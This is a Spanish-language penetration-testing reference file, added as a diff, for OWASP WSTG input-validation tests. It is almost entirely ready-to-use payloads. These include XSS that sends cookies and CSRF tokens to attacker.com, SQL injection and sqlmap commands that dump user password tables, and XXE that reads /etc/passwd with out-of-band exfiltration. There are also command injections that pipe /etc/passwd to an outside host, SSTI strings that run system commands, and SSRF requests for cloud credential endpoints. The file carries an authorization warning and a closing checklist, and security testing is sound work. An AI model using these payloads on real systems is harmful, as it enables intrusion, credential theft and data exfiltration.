@@ -1,0 +1,533 @@
+============================================================
+VALIDACION DE ENTRADA (WSTG 4.7)
+Formato TXT para procesamiento con IA
+============================================================
+
+8. Validacion de Entrada (WSTG 4.7)
+
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| SECCION CRITICA                                                                                                                                                                       |
+|                                                                                                                                                                                       |
+| Esta seccion cubre las vulnerabilidades de mayor impacto. Ejecutar estas pruebas solo con autorizacion escrita. Algunos payloads pueden causar impacto en bases de datos o servicios. |
++=======================================================================================================================================================================================+
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+4.7.1 XSS Reflejado (WSTG-INPV-01)
+
+Payloads por contexto de inyeccion:
+
+Contexto HTML (dentro de etiqueta o texto plano):
+
+------------------------------------------------------------
+  Payload XSS                               Descripcion y uso
+  ----------------------------------------- -------------------------------------------------
+  <script>alert(document.domain)</script>   Payload basico, detecta contexto HTML directo
+
+  "><script>alert(1)</script>               Cierra atributo + inyecta script
+
+  '><img src=x onerror=alert(1)>            Alternativa sin script, funciona con CSP basica
+
+  <svg onload=alert(1)>                     SVG event handler, bypasea filtros de script
+
+  <details open ontoggle=alert(1)>          HTML5 event, no requiere interaccion en Firefox
+
+  <iframe src=javascript:alert(1)>          javascript: URI en atributo src
+
+  <body onload=alert(1)>                    Requiere que se inyecte en el body
+------------------------------------------------------------
+
+Contexto dentro de atributo HTML:
+
+------------------------------------------------------------
+  # Si se inyecta en: <input value="INYECCION" type="text">
+------------------------------------------------------------
+  " onmouseover="alert(1)
+
+  " onfocus="alert(1)" autofocus="
+
+  " onblur="alert(1)
+
+  # Si se inyecta en: <a href="INYECCION">
+
+  javascript:alert(document.cookie)
+
+  javascript:alert(1)//
+------------------------------------------------------------
+
+Contexto dentro de JavaScript:
+
+------------------------------------------------------------
+  # Si la app hace: var x = 'INYECCION';
+------------------------------------------------------------
+  ';alert(document.domain)//'
+
+  '-alert(1)-'
+
+  \'; alert(1)//
+
+  # Si usa template literals: `Hola ${INYECCION}`
+
+  ${alert(1)}
+
+  # Si se usa en JSON: {"name": "INYECCION"}
+
+  \"};alert(1);//
+------------------------------------------------------------
+
+Bypass de filtros comunes:
+
+------------------------------------------------------------
+  # Filtro elimina 'script' => case variation
+------------------------------------------------------------
+  <ScRiPt>alert(1)</ScRiPt>
+
+  <SCRIPT>alert(1)</SCRIPT>
+
+  # Filtro elimina 'alert' => alternativas
+
+  <script>confirm(1)</script>
+
+  <script>prompt(1)</script>
+
+  <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+  # Filtro elimina <> => encoding HTML
+
+  &lt;script&gt;alert(1)&lt;/script&gt;   # no funciona si el encode es del browser
+
+  # Doble encoding
+
+  %253Cscript%253Ealert(1)%253C/script%253E
+
+  # Null bytes (algunos parsers)
+
+  <scr%00ipt>alert(1)</scr%00ipt>
+------------------------------------------------------------
+
+XSS para robo de cookies (payload real):
+
+------------------------------------------------------------
+  # Payload que exfiltra cookies a servidor del atacante:
+------------------------------------------------------------
+  <script>
+
+  new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie);
+
+  </script>
+
+  # Alternativa via fetch:
+
+  <script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>
+
+  # XSS que roba el token CSRF para encadenar con CSRF:
+
+  <script>
+
+  fetch('/account/settings').then(r=>r.text()).then(h=>{
+
+    let tok=h.match(/csrf_token.*?value=["']([^"']+)/)[1];
+
+    fetch('https://attacker.com/tok?t='+tok);
+
+  });
+
+  </script>
+------------------------------------------------------------
+
+4.7.2 XSS Almacenado (WSTG-INPV-02)
+
+Vectores de inyeccion para XSS almacenado:
+
+------------------------------------------------------------
+  # Campo de comentario en blog:
+------------------------------------------------------------
+  POST /api/comments {"text": "<script>alert(document.domain)</script>"}
+
+  # Campo de nombre de usuario en perfil:
+
+  PUT /api/profile {"name": "<img src=x onerror=alert(1)>"}
+
+  # Ticket de soporte:
+
+  POST /support {"subject": "Problema", "body": "<svg onload=alert(1)>"}
+
+  # Campo de nombre en admin panel (XSS almacenado que solo ve el admin):
+
+  # => Permite robo de sesion de administrador
+
+  # URL en campo de website de usuario:
+
+  PUT /api/profile {"website": "javascript:alert(1)"}
+
+  # Si se renderiza como <a href='javascript:alert(1)'> => XSS al hacer click
+
+  # Payload en metadata de archivo subido:
+
+  exiftool -Comment='<script>alert(1)</script>' imagen.jpg
+
+  # Si la app muestra los metadatos en HTML sin escapar
+------------------------------------------------------------
+
+4.7.5 SQL Injection (WSTG-INPV-05)
+
+Deteccion de SQL Injection — tecnicas por tipo:
+
+Error-based detection:
+
+------------------------------------------------------------
+  Payload                                          Descripcion
+  ------------------------------------------------ --------------------------------------------------------------------
+  '                                                Error de sintaxis SQL basico. Respuesta diferente = potencial SQLi
+
+  ''                                               Dos comillas simples - recovery del error
+
+  ' AND 1=1--                                      True condition - debe comportarse igual que sin payload
+
+  ' AND 1=2--                                      False condition - resultado diferente = SQLi booleana confirmada
+
+  ' AND SLEEP(5)--                                 Time-based: si tarda 5s adicionales = SQLi confirmada
+
+  '; WAITFOR DELAY '0:0:5'--                       Time-based para MSSQL
+
+  ' AND 1=CONVERT(int,'a')--                       Error-based MSSQL
+
+  ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--   Error-based MySQL
+
+  ' AND 1=1 UNION SELECT null--                    Union-based: ajustar numero de columnas
+------------------------------------------------------------
+
+SQLi Union-based — extraccion de datos:
+
+------------------------------------------------------------
+  # Paso 1: Determinar numero de columnas
+------------------------------------------------------------
+  ' ORDER BY 1--   ' ORDER BY 2--   ' ORDER BY 3--
+
+  # Cuando cambia el error: tiene N-1 columnas
+
+  ' UNION SELECT NULL--
+
+  ' UNION SELECT NULL,NULL--
+
+  ' UNION SELECT NULL,NULL,NULL--  # continuar hasta sin error
+
+  # Paso 2: Encontrar columna que muestra datos de texto
+
+  ' UNION SELECT 'a',NULL,NULL--
+
+  ' UNION SELECT NULL,'a',NULL--   # continuar hasta ver 'a' en respuesta
+
+  # Paso 3: Extraer datos (MySQL):
+
+  ' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+  ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+  ' UNION SELECT username,password FROM users--
+
+  # Paso 4: Extraer datos en columna unica (concatenar):
+
+  ' UNION SELECT CONCAT(username,':',password),NULL FROM users--
+------------------------------------------------------------
+
+SQLi Blind boolean-based — extraccion caracter a caracter:
+
+------------------------------------------------------------
+  # Pregunta: el primer caracter del nombre de la DB es 'p'?
+------------------------------------------------------------
+  ' AND SUBSTRING(database(),1,1)='p'--
+
+  # Si la respuesta es igual a la original => True => primera letra es 'p'
+
+  # Automatizar con sqlmap:
+
+  sqlmap -u 'https://objetivo.com/product?id=1' --dbs --batch
+
+  sqlmap -u 'https://objetivo.com/product?id=1' -D produccion --tables
+
+  sqlmap -u 'https://objetivo.com/product?id=1' -D produccion -T users --dump
+
+  # Para POST:
+
+  sqlmap -u 'https://objetivo.com/login' \
+
+        --data='username=admin&password=test' \
+
+        -p username --dbs --batch
+
+  # Para cookies:
+
+  sqlmap -u 'https://objetivo.com/profile' \
+
+        --cookie='session=abc123; user_id=1' \
+
+        -p user_id --dbs --batch
+------------------------------------------------------------
+
+SQLi especifica por motor de base de datos:
+
+------------------------------------------------------------
+  Funcion         MySQL                       MSSQL                       Oracle
+  --------------- --------------------------- --------------------------- ------------------------------------
+  Version         @@version                   @@version                   SELECT banner FROM v$version
+
+  DB actual       database()                  DB_NAME()                   SELECT ora_database_name FROM dual
+
+  Tablas          information_schema.tables   INFORMATION_SCHEMA.TABLES   all_tables
+
+  Delay           SLEEP(5)                    WAITFOR DELAY '0:0:5'       dbms_pipe.receive_message('x',5)
+
+  String concat   CONCAT(a,b)                 a+b                         a||b
+
+  Comentario      -- o #                      --                          --
+------------------------------------------------------------
+
+4.7.7 XML/XXE Injection (WSTG-INPV-07)
+
+Payloads XXE — lectura de archivos:
+
+------------------------------------------------------------
+  # XXE basico - Linux:
+------------------------------------------------------------
+  <?xml version="1.0" encoding="UTF-8"?>
+
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+  <root><data>&xxe;</data></root>
+
+  # XXE basico - Windows:
+
+  <?xml version="1.0"?>
+
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
+
+  <root><data>&xxe;</data></root>
+
+  # XXE para SSRF (acceder a servicios internos):
+
+  <?xml version="1.0"?>
+
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+
+  <root><data>&xxe;</data></root>
+
+  # 169.254.169.254 = metadata de AWS EC2
+
+  # XXE Out-of-Band (cuando no se muestra el output en respuesta):
+
+  <?xml version="1.0"?>
+
+  <!DOCTYPE foo [
+
+    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+
+    %dtd;
+
+  ]>
+
+  <root><data>&exfil;</data></root>
+
+  # evil.dtd en attacker.com:
+
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+
+  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+
+  %eval;
+------------------------------------------------------------
+
+4.7.12 Command Injection (WSTG-INPV-12)
+
+Payloads de command injection por sistema operativo:
+
+Operadores de encadenamiento Unix/Linux:
+
+------------------------------------------------------------
+  Payload                                Descripcion
+  -------------------------------------- -------------------------------------------------
+  ; whoami                               Ejecuta despues del comando original (siempre)
+
+  & whoami                               Ejecuta en background, continua el original
+
+  && whoami                              Ejecuta solo si el original tuvo exito (AND)
+
+  || whoami                              Ejecuta solo si el original fallo (OR)
+
+  | whoami                               Pipe: output del primero como input del segundo
+
+  `whoami`                               Backtick: substitucion de comando
+
+  $(whoami)                              Dollar-parenthesis: substitucion de comando
+
+  %0awhoami                              Newline injection
+
+  ; ping -c 5 attacker.com               Time-based detection via ping
+
+  ; curl http://attacker.com/$(whoami)   Exfiltracion de output via HTTP
+------------------------------------------------------------
+
+Ejemplos en contextos de aplicacion reales:
+
+------------------------------------------------------------
+  # Campo de hostname en utilidad de ping de la app:
+------------------------------------------------------------
+  POST /tools/ping {"host": "8.8.8.8; whoami"}
+
+  # Campo de nombre de archivo en conversion:
+
+  POST /convert {"filename": "document.pdf; ls -la /"}
+
+  # Parametro de email en notificaciones:
+
+  POST /notify {"email": "test@test.com; cat /etc/passwd | curl -d @- http://attacker.com"}
+
+  # Time-based blind (cuando no se muestra output):
+
+  POST /tools/lookup {"domain": "objetivo.com; sleep 5"}
+
+  # Si la respuesta tarda 5s adicionales => RCE confirmado sin output
+
+  # Exfiltracion via DNS (cuando HTTP bloqueado):
+
+  POST /tools/ping {"host": "$(whoami).attacker.com"}
+
+  # Revisar logs de DNS en attacker.com: www-data.attacker.com
+------------------------------------------------------------
+
+4.7.18 Server-Side Template Injection (WSTG-INPV-18)
+
+Payloads de deteccion por motor de plantillas:
+
+------------------------------------------------------------
+  Payload                 Motor de plantillas
+  ----------------------- ------------------------------------------------
+  {{7*7}}                 Jinja2/Twig/Tornado - debe devolver '49'
+
+  ${7*7}                  Freemarker/Thymeleaf - debe devolver '49'
+
+  <%= 7*7 %>              ERB (Ruby) - debe devolver '49'
+
+  #{7*7}                  Pug (Node.js) - debe devolver '49'
+
+  *{7*7}                  Thymeleaf selection expressions
+
+  {{7*'7'}}               Jinja2 devuelve '7777777', Twig devuelve '49'
+
+  {{'a'.toUpperCase()}}   Pebble Java template engine
+
+  @(7*7)                  Razor (ASP.NET)
+------------------------------------------------------------
+
+SSTI en Jinja2 (Python) — escalada a RCE:
+
+------------------------------------------------------------
+  # Deteccion:
+------------------------------------------------------------
+  {{7*7}}  => 49 en respuesta
+
+  # Ejecucion de comandos via Jinja2:
+
+  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+  # Alternativa mas robusta:
+
+  {% for x in ().__class__.__base__.__subclasses__() %}
+
+    {% if 'warning' in x.__name__ %}
+
+      {{x()._module.__builtins__['__import__']('os').popen('id').read()}}
+
+    {% endif %}
+
+  {% endfor %}
+
+  # SSTI en Freemarker (Java):
+
+  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+  # SSTI en Pebble (Java):
+
+  {{variable.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(variable.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}}
+------------------------------------------------------------
+
+4.7.19 SSRF — Server-Side Request Forgery (WSTG-INPV-19)
+
+Payloads y objetivos de SSRF:
+
+------------------------------------------------------------
+  # Deteccion basica — hacer que el servidor contacte attacker.com:
+------------------------------------------------------------
+  POST /api/fetch {"url": "https://attacker.com/ssrf-test"}
+
+  # Si attacker.com recibe el request => SSRF confirmado
+
+  # SSRF hacia metadata de cloud (AWS):
+
+  POST /api/fetch {"url": "http://169.254.169.254/latest/meta-data/"}
+
+  POST /api/fetch {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+
+  # Puede revelar: Access Keys de AWS de la instancia EC2
+
+  # SSRF hacia metadata de GCP:
+
+  POST /api/fetch {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}
+
+  # SSRF hacia servicios internos:
+
+  POST /api/fetch {"url": "http://localhost:8080/actuator/env"}
+
+  POST /api/fetch {"url": "http://internal-db:3306"}
+
+  POST /api/fetch {"url": "http://192.168.1.1/admin"}
+
+  # SSRF bypass de filtros:
+
+  http://127.0.0.1/           # localhost IPv4
+
+  http://[::1]/               # localhost IPv6
+
+  http://0.0.0.0/             # INADDR_ANY
+
+  http://127.1/               # notacion acortada
+
+  http://2130706433/          # 127.0.0.1 en decimal
+
+  http://0177.0.0.01/         # 127.0.0.1 en octal
+
+  http://spoofed.attacker.com/# DNS que resuelve a 127.0.0.1
+------------------------------------------------------------
+
+CHECKLIST — Validacion de Entrada
+
+------------------------------------------------------------
+  ID        Prueba                       Objetivo                                  Tool / OpenClaw
+  --------- ---------------------------- ----------------------------------------- ----------------------------
+  INPV-01   XSS Reflejado                Sin ejecucion de scripts en respuesta     XSS payloads / Burp
+
+  INPV-02   XSS Almacenado               Sin payload persistente en DB             Stored XSS test
+
+  INPV-03   HTTP Verb Tampering          Controles no bypasseables por verbo       Method override
+
+  INPV-04   HTTP Parameter Pollution     Params duplicados manejados seguro        Duplicate params
+
+  INPV-05   SQL Injection                Queries parametrizadas                    sqlmap / payloads manuales
+
+  INPV-06   LDAP Injection               Filtros LDAP sanitizados                  LDAP payloads
+
+  INPV-07   XXE Injection                Entidades XML externas deshabilitadas     XXE payloads
+
+  INPV-08   SSI Injection                Sin directivas SSI procesadas             SSI payloads
+
+  INPV-09   XPath Injection              Consultas XPath parametrizadas            XPath payloads
+
+  INPV-11   LFI / RFI / Code Injection   Sin inclusion de archivos externos        Path traversal / URL
+
+  INPV-12   Command Injection            Sin ejecucion de OS commands              OS cmd payloads
+
+  INPV-17   Host Header Injection        Header Host validado en servidor          Host manipulation
+
+  INPV-18   SSTI                         Sin inyeccion en templates del servidor   {{7*7}} payloads
+
+  INPV-19   SSRF                         Sin requests a recursos internos/cloud    Internal URL + OOB
+------------------------------------------------------------
